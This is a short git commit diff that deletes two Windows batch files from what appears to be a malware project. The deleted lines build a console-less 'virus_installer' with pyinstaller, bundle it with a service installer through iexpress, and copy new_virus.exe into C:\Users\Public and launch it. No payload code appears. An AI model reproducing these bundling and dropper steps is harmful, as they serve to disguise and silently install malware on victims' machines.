30a29a216ef0400eb515ccb2c01db391dafea19e
Daniel Eidlin <daniel.eidlin@gmail.com>
2020-04-24 08:35:31 -0700

    Delete all unnecessary files

--- build_installer.bat
+++
@@ -1,3 +0,0 @@
-pyinstaller service_installer.py --noconsole --onefile
-pyinstaller virus_installer.py --noconsole --onefile
-iexpress /N MergeInstallers.SED
--- installer.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-xcopy /y new_virus.exe "C:\Users\Public\"
-cd C:\Users\Public\
-new_virus.exe -i
